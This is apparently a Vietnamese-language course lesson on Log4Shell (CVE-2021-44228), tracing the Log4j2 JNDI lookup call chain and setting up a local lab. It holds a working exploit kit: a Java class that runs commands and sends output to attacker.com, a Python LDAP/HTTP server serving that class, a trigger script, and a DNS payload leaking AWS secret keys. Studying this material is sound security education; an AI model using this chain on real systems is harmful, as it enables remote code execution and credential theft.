---
title: "09. Log4Shell Part 1 — JNDI/LDAP Chain & Root Cause"
tags: [security, cve, landmark-cves, log4shell, log4j, jndi, ldap, java, rce, lesson-09]
aliases: [Log4Shell Part 1, CVE-2021-44228 Root Cause]
created: 2026-03-24
---

> **Prerequisites**: [[01-memory-model-exploit-primitives|01. Memory Model & Exploit Primitives]], Java cơ bản (class, classloader, JVM), HTTP basics
> **Objectives**:
> - Hiểu Log4j2 Lookup system — tại sao `${...}` được evaluate trong log message
> - Phân tích source code `JndiLookup.java` và `MessagePatternConverter.java`
> - Hiểu JNDI (Java Naming and Directory Interface) và cơ chế remote object loading
> - Trace đầy đủ call chain: `logger.info(input)` → JNDI lookup → remote classload → RCE
> - Nắm được tại sao Java ClassLoader có thể load và execute code từ URL bất kỳ
> - Dựng LDAP server + HTTP server để serve malicious Java class
> - Hiểu sự khác biệt giữa Java 8 và Java 11/17 trong context exploit

---

## Bối cảnh: Một Logging Library Phá Vỡ Internet

Ngày 9/12/2021, một researcher của Alibaba Cloud tweet một exploit zero-day nhắm vào Log4j2 (tweet sau đó bị xóa). Trong vòng vài giờ, hàng triệu request khai thác đã tràn khắp internet. Đây là thời điểm mà cộng đồng bảo mật dùng từ "pandemonium" để mô tả.

Tại sao Log4Shell (CVE-2021-44228) lại gây chấn động đến vậy?

- **Log4j2 có mặt ở khắp nơi**: ~7.000 Maven packages phụ thuộc vào nó — Apache Struts, Solr, Minecraft, Steam, iCloud, Twitter, Amazon AWS, v.v.
- **Khai thác trivially easy**: một HTTP request với header `User-Agent: ${jndi:ldap://evil.com/x}` là đủ
- **Pre-authentication, không cần credential**
- **CVSS 10.0** — tối đa
- **Existed since 2013**: feature bị lỗi được commit vào tháng 7/2013, ẩn náu 8 năm
- **93% cloud enterprise environments bị ảnh hưởng** (theo Wiz/EY research)

Lỗi này không phải memory bug như Heartbleed hay EternalBlue. Nó là một **design flaw**: tính năng tiện lợi (lookup) kết hợp với trust vô điều kiện vào external resources.

---

## Log4j2 Architecture — Lookup System

### Log4j2 là gì?

Log4j2 (`log4j-core`) là logging framework phổ biến nhất cho Java. Sử dụng cơ bản:

```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class App {
    private static final Logger logger = LogManager.getLogger(App.class);

    public void handleRequest(String userInput) {
        logger.info("Received input: {}", userInput);
        // Nếu userInput = "${jndi:ldap://evil.com/x}" → PWNED
    }
}
```

### Message Lookup System

Log4j2 hỗ trợ **Lookup** — cơ chế thay thế `${prefix:key}` bằng giá trị động trong log message. Đây là feature hợp lệ cho phép nhúng thông tin hệ thống vào log:

```text
${java:version}        → "Java version 11.0.13"
${env:HOME}            → "/home/ubuntu"
${sys:user.name}       → "www-data"
${date:yyyy-MM-dd}     → "2021-12-09"
${ctx:userId}          → value từ ThreadContext
${jndi:ldap://...}     → ← ĐÂY LÀ VẤN ĐỀ
```

### Các Lookup được đăng ký trong Log4j2

```java
// Log4j2 source — JndiLookupPlugin.java và StrLookupManager
public class Interpolator extends AbstractStrLookup {
    private final Map<String, StrLookup> strLookupMap = new HashMap<>();

    public Interpolator(final Properties properties) {
        // Đăng ký tất cả Lookup providers
        final ClassLoader cl = LoaderUtil.getThreadContextClassLoader();
        for (final String pkg : LOOKUP_PACKAGES) {
            // Auto-discover các @Plugin(category = "Lookup") classes
            // Bao gồm: JndiLookup, JavaLookup, EnvLookup, DateLookup, ...
        }
    }

    @Override
    public String lookup(final LogEvent event, final String var) {
        // var = "jndi:ldap://evil.com/x"
        final int prefixPos = var.indexOf(':');
        final String scheme = var.substring(0, prefixPos);    // "jndi"
        final String name = var.substring(prefixPos + 1);     // "ldap://evil.com/x"

        final StrLookup lookup = strLookupMap.get(scheme);
        // lookup = JndiLookup instance
        return lookup.lookup(name);
        // ← gọi JNDI lookup với URL do attacker kiểm soát!
    }
}
```

### JndiLookup.java — Điểm Lỗi

```java
// Log4j2 2.14.1 — JndiLookup.java (vulnerable)
@Plugin(name = "jndi", category = "Lookup")
public class JndiLookup extends AbstractLookup {

    @Override
    public String lookup(final LogEvent event, final String key) {
        if (key == null) return null;

        try (final JndiManager jndiManager = JndiManager.getDefaultManager()) {
            // key = "ldap://evil.com/x" (từ ${jndi:ldap://evil.com/x})
            // KHÔNG CÓ BẤT KỲ VALIDATION NÀO VỀ:
            //   - host/IP có được phép không
            //   - protocol có an toàn không
            //   - class được load có trusted không
            return Objects.toString(jndiManager.lookup(key), null);
            //  ↑ thực hiện JNDI lookup tới URL do attacker kiểm soát
        }
    }
}
```

`jndiManager.lookup(key)` gọi vào Java's `InitialContext.lookup()` — đây là nơi xảy ra magic nguy hiểm.

---

## JNDI — Java Naming and Directory Interface

### JNDI là gì?

JNDI là Java API cho phép ứng dụng lookup object từ một "directory service" (LDAP, RMI, DNS, CORBA) theo tên. Ví dụ legitimate:

```java
// Lookup database connection từ LDAP directory
Context ctx = new InitialContext();
DataSource ds = (DataSource) ctx.lookup("ldap://internal-ldap:389/cn=mydb,dc=company,dc=com");
Connection conn = ds.getConnection();
```

JNDI hỗ trợ nhiều protocol:

| Protocol | URI scheme | Port mặc định |
|---------|-----------|--------------|
| LDAP | `ldap://` | 389 |
| LDAPS | `ldaps://` | 636 |
| RMI | `rmi://` | 1099 |
| DNS | `dns://` | 53 |
| CORBA/IIOP | `iiop://` | 900 |

### JNDI Object Loading — Cơ Chế Nguy Hiểm

Khi JNDI lookup một LDAP URL, quá trình xảy ra như sau:

```text
Step 1: Java client kết nối TCP đến LDAP server (attacker-controlled)
Step 2: LDAP server trả về LDAP response chứa một Reference object:
        Reference ref = new Reference(
            "Exploit",                           // class name
            "Exploit",                           // factory class name
            "http://attacker.com:8888/"          // codebase URL ← remote!
        )
Step 3: JNDI client nhìn thấy Reference với codebase URL
Step 4: Java ClassLoader fetch Exploit.class từ http://attacker.com:8888/Exploit.class
Step 5: ClassLoader load và instantiate class này → constructor chạy
Step 6: Attacker code thực thi trong context của victim JVM
```

> [!definition] Definition 9.1 — JNDI Remote Class Loading
> Khi JNDI nhận một `Reference` object với `classFactory` chưa có trong local classpath, nó tự động **download class file từ `codeBase` URL** và load vào JVM. Đây là feature được thiết kế để hỗ trợ dynamic object loading — nhưng trong bối cảnh attacker kiểm soát LDAP URL, nó cho phép execute arbitrary code.
>
> **Java 8u191+ và Java 11**: đã disable remote class loading qua LDAP theo mặc định (`com.sun.jndi.ldap.object.trustURLCodebase = false`). Nhưng các bypass vẫn tồn tại (xem bài 10).

---

## Call Chain Đầy Đủ

Trace từ HTTP request đến RCE:

```text
1. HTTP Request đến victim server:
   GET /search HTTP/1.1
   User-Agent: ${jndi:ldap://attacker.com:1389/Exploit}

2. Application code log User-Agent:
   logger.info("Request from: " + request.getHeader("User-Agent"));
   // String = "Request from: ${jndi:ldap://attacker.com:1389/Exploit}"

3. Log4j2 MessagePatternConverter xử lý message:
   PatternLayout.format() →
     MessagePatternConverter.format() →
       StrSubstitutor.replace() →
         Interpolator.lookup("jndi", "ldap://attacker.com:1389/Exploit")

4. JndiLookup.lookup("ldap://attacker.com:1389/Exploit") được gọi

5. JndiManager.lookup() → InitialContext.lookup("ldap://attacker.com:1389/Exploit")
   → Java mở TCP connection đến attacker.com:1389

6. Attacker LDAP server (ví dụ: marshalsec) phản hồi với Reference:
   Reference("Exploit", "Exploit", "http://attacker.com:8888/")

7. Java ClassLoader fetch http://attacker.com:8888/Exploit.class

8. Class được load vào JVM, constructor/static initializer chạy:
   public class Exploit {
       static {
           Runtime.getRuntime().exec("curl http://attacker.com/pwned");
       }
   }

9. → RCE với privileges của Java process (thường là www-data hoặc root)
```

### MessagePatternConverter — Tại sao Log Message được Evaluate?

```java
// Log4j2 2.14.1 — MessagePatternConverter.java
public final class MessagePatternConverter extends LogEventPatternConverter {
    @Override
    public void format(final LogEvent event, final StringBuilder toAppendTo) {
        final Message msg = event.getMessage();
        if (msg instanceof StringBuilderFormattable) {
            // ...
        }
        final String result = msg.getFormattedMessage();

        // ← ĐÂY: nếu pattern layout có StrSubstitutor, nó sẽ replace ${...}
        if (config != null && config.getStrSubstitutor() != null) {
            String substituted = config.getStrSubstitutor().replace(event, result);
            toAppendTo.append(substituted);
        } else {
            toAppendTo.append(result);
        }
    }
}
```

`StrSubstitutor.replace()` là recursive substitutor — nó tìm tất cả `${...}` pattern và evaluate. Đây là thứ biến logging call thành code execution.

---

## Lab Setup — LDAP Server + HTTP Server + Vulnerable App

### Dựng target

```bash
docker pull ghcr.io/christophetd/log4shell-vulnerable-app:latest
docker run -d --name log4shell -p 8080:8080 \
  ghcr.io/christophetd/log4shell-vulnerable-app

curl http://localhost:8080
```

### Malicious Java Payload

```java
// Exploit.java — chạy khi được load bởi victim JVM
public class Exploit {
    static {
        try {
            String cmd = System.getProperty("exploit.cmd", "id");
            String[] cmdArray = new String[]{"/bin/sh", "-c", cmd};
            Process p = Runtime.getRuntime().exec(cmdArray);

            // Đọc output (nếu muốn exfiltrate)
            java.io.InputStream is = p.getInputStream();
            byte[] buf = new byte[1024];
            int len;
            StringBuilder sb = new StringBuilder();
            while ((len = is.read(buf)) != -1) {
                sb.append(new String(buf, 0, len));
            }
            // Gửi output về attacker
            java.net.URL u = new java.net.URL(
                "http://attacker.com:9999/?out=" +
                java.net.URLEncoder.encode(sb.toString(), "UTF-8")
            );
            u.openConnection().getInputStream();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

Compile:

```bash
# Cần Java 8 để tương thích với victim
javac -source 8 -target 8 Exploit.java
```

### Python LDAP Server đơn giản

```python
import socketserver
import struct

ATTACKER_IP = "192.168.1.10"
HTTP_PORT   = 8888
LDAP_PORT   = 1389

def build_ldap_response(codebase_url, class_name):
    """
    Tạo LDAP response chứa Reference object trỏ đến codebase.
    Response format là LDAP BER encoding.
    """
    # LDAP Search Result Entry với javaCodeBase và javaClassName attributes
    # Đây là simplified version — production dùng marshalsec hoặc JNDI-Exploit-Kit
    
    class_name_bytes = class_name.encode()
    codebase_bytes = codebase_url.encode()
    
    # Build Reference attributes
    attrs = (
        build_ldap_attr("javaClassName",        class_name_bytes) +
        build_ldap_attr("javaCodeBase",         codebase_bytes) +
        build_ldap_attr("objectClass",          b"javaNamingReference") +
        build_ldap_attr("javaFactory",          class_name_bytes)
    )
    
    return attrs

def build_ldap_attr(name, value):
    n = name.encode()
    return (
        bytes([0x30]) + encode_length(len(n) + len(value) + 10) +
        bytes([0x04]) + encode_length(len(n)) + n +
        bytes([0x31, 0x0b, 0x04]) + encode_length(len(value)) + value
    )

def encode_length(n):
    if n < 128:
        return bytes([n])
    elif n < 256:
        return bytes([0x81, n])
    else:
        return bytes([0x82, n >> 8, n & 0xff])

class LDAPHandler(socketserver.BaseRequestHandler):
    def handle(self):
        data = self.request.recv(4096)
        print(f"[LDAP] Connection from {self.client_address[0]}")
        print(f"[LDAP] Received {len(data)} bytes: {data[:50].hex()}...")
        
        # Parse message ID từ LDAP request
        msg_id = data[4] if len(data) > 4 else 1
        
        # Gửi LDAP Bind Response (thành công)
        bind_resp = bytes([
            0x30, 0x0c,          # SEQUENCE
            0x02, 0x01, msg_id,  # messageID
            0x61, 0x07,          # BindResponse
            0x0a, 0x01, 0x00,    # resultCode: success
            0x04, 0x00,          # matchedDN: ""
            0x04, 0x00           # diagnosticMessage: ""
        ])
        self.request.send(bind_resp)
        
        # Nhận Search Request
        data2 = self.request.recv(4096)
        if not data2:
            return
        
        msg_id2 = data2[4] if len(data2) > 4 else 2
        codebase = f"http://{ATTACKER_IP}:{HTTP_PORT}/"
        class_name = "Exploit"
        
        print(f"[LDAP] Sending malicious Reference → {codebase}{class_name}.class")
        
        # Search Result Entry (với Reference attributes)
        attrs = build_ldap_response(codebase, class_name)
        
        search_entry = (
            bytes([0x30]) + encode_length(len(attrs) + 20) +
            bytes([0x02, 0x01, msg_id2]) +
            bytes([0x64]) + encode_length(len(attrs) + 14) +
            bytes([0x04, 0x00]) +  # objectName: ""
            bytes([0x30]) + encode_length(len(attrs)) +
            attrs
        )
        self.request.send(search_entry)
        
        # Search Result Done
        done = bytes([
            0x30, 0x0c,
            0x02, 0x01, msg_id2,
            0x65, 0x07,          # SearchResultDone
            0x0a, 0x01, 0x00,
            0x04, 0x00,
            0x04, 0x00
        ])
        self.request.send(done)
        print(f"[LDAP] Reference sent — waiting for victim to fetch class...")

class HTTPHandler(socketserver.BaseRequestHandler):
    def handle(self):
        data = self.request.recv(4096)
        request_line = data.decode('utf-8', errors='replace').split('\r\n')[0]
        print(f"[HTTP] {self.client_address[0]} → {request_line}")
        
        if 'Exploit.class' in request_line:
            try:
                with open('Exploit.class', 'rb') as f:
                    class_bytes = f.read()
                resp = (
                    f"HTTP/1.1 200 OK\r\n"
                    f"Content-Type: application/octet-stream\r\n"
                    f"Content-Length: {len(class_bytes)}\r\n\r\n"
                ).encode() + class_bytes
                self.request.send(resp)
                print(f"[HTTP] Sent Exploit.class ({len(class_bytes)} bytes) → AWAITING RCE")
            except FileNotFoundError:
                self.request.send(b"HTTP/1.1 404 Not Found\r\n\r\n")
                print("[HTTP] ERROR: Exploit.class not found! Run: javac Exploit.java")
        else:
            # Exfil output?
            if 'out=' in request_line:
                import urllib.parse
                out = request_line.split('out=')[1].split(' ')[0]
                print(f"\n[!!!] COMMAND OUTPUT RECEIVED:")
                print(urllib.parse.unquote_plus(out))
            self.request.send(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")

if __name__ == '__main__':
    import threading
    
    ldap_server = socketserver.ThreadingTCPServer(('0.0.0.0', LDAP_PORT), LDAPHandler)
    http_server = socketserver.ThreadingTCPServer(('0.0.0.0', HTTP_PORT), HTTPHandler)
    ldap_server.allow_reuse_address = True
    http_server.allow_reuse_address = True
    
    print(f"[*] LDAP server listening on :{LDAP_PORT}")
    print(f"[*] HTTP server listening on :{HTTP_PORT}")
    print(f"[*] Attacker IP: {ATTACKER_IP}")
    print(f"[*] Payload: ${{jndi:ldap://{ATTACKER_IP}:{LDAP_PORT}/Exploit}}")
    print()
    
    t1 = threading.Thread(target=ldap_server.serve_forever)
    t2 = threading.Thread(target=http_server.serve_forever)
    t1.daemon = t2.daemon = True
    t1.start()
    t2.start()
    
    try:
        import time
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("[*] Shutting down")
```

### Trigger từ Attacker

```python
import requests

VICTIM = "http://localhost:8080"
ATTACKER_LDAP = "192.168.1.10:1389"

def trigger_log4shell(endpoint, header_name="X-Api-Version"):
    payload = f"${{jndi:ldap://{ATTACKER_LDAP}/Exploit}}"
    headers = {header_name: payload}
    
    print(f"[*] Sending payload: {payload}")
    print(f"[*] Via header: {header_name}")
    
    try:
        resp = requests.get(VICTIM + endpoint, headers=headers, timeout=5)
        print(f"[*] Response: {resp.status_code} ({len(resp.content)} bytes)")
    except requests.exceptions.RequestException as e:
        print(f"[*] Request error (may be normal): {e}")

trigger_log4shell("/")
```

---

## Java Version Matters — Old vs New

| Java Version | Remote LDAP class loading | Exploit path |
|-------------|--------------------------|-------------|
| ≤ 8u191 | **Enabled** (trustURLCodebase=true) | Trực tiếp: LDAP → remote class |
| ≥ 8u191, 11, 17 | **Disabled** (trustURLCodebase=false) | Cần bypass: BeanFactory, gadget chains |
| 17+ với module system | Thêm restriction với `--add-opens` | Harder nhưng không impossible |

Bài 10 sẽ cover các bypass cho Java mới hơn.

---

## Wireshark Analysis — DNS Exfil

Log4Shell thường được phát hiện qua **DNS exfil** trước khi LDAP exploit thành công. Ngay cả với Java mới (LDAP class loading disabled), DNS lookup vẫn xảy ra:

```text
Payload: ${jndi:dns://attacker.com/${env:AWS_SECRET_ACCESS_KEY}}
→ victim server DNS-resolve: <secret_key_value>.attacker.com
→ Attacker DNS server nhận query chứa secret!
```

Filter Wireshark:

```text
dns && dns.qry.name contains "attacker"
```

Dấu hiệu trong DNS log:

```text
# Normal DNS
2021-12-09 12:34:56 DNS query: api.service.com → 1.2.3.4

# Log4Shell DNS exfil
2021-12-09 12:35:01 DNS query: AKIA1234SECRETKEY.attacker.com
                               ↑ AWS access key leaked via DNS!
2021-12-09 12:35:02 DNS query: ldap.attacker.com → 1.2.3.4
                               ↑ JNDI lookup attempt
```

---

## Summary

- Log4j2 có Lookup system cho phép evaluate `${prefix:key}` trong log message — feature hợp lệ nhưng nguy hiểm khi nhận user input
- `JndiLookup` handler thực hiện JNDI lookup với URL do attacker kiểm soát — không có validation
- JNDI + LDAP cho phép Java ClassLoader **load và execute class file từ URL tùy ý** trên attacker server
- Call chain: `logger.info(userInput)` → `StrSubstitutor` → `JndiLookup` → `InitialContext.lookup()` → TCP → LDAP → HTTP fetch class → ClassLoader → **RCE**
- Java 8 ≤ u191: trực tiếp via remote class loading. Java ≥ 8u191: cần bypass (bài 10)
- Ngay cả khi class loading bị disable, **DNS lookup vẫn xảy ra** → exfil env vars qua DNS
- **Lớp lỗ hổng**: JNDI Injection — feature trust quá mức, không restrict outbound connection

---

## References

- LunaSec original disclosure: https://www.lunasec.io/docs/blog/log4j-zero-day/
- Log4j2 source `JndiLookup.java` (2.14.1): https://github.com/apache/logging-log4j2/blob/rel/2.14.1/log4j-core/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.java
- Cloudflare technical analysis: https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/
- JFrog full timeline: https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/
- Blackhat 2016 JNDI/LDAP paper (Muñoz & Mirosh): https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf
- kozmer PoC lab: https://github.com/kozmer/log4j-shell-poc
- Wikipedia Log4Shell: https://en.wikipedia.org/wiki/Log4Shell
